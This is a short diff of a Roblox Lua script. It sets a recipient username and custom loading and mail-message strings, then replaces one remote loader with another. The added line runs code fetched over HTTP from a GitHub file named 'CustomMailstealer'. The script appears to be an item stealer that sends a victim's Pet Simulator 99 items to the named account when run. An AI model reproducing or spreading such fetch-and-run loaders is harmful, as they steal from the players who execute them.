@@ -1,2 +1,5 @@
 Username = "PogrzaloCie"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+G_LoadingScreen = "YajzaHub"
+G_Mailmessage = "YajzaHubTHX"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
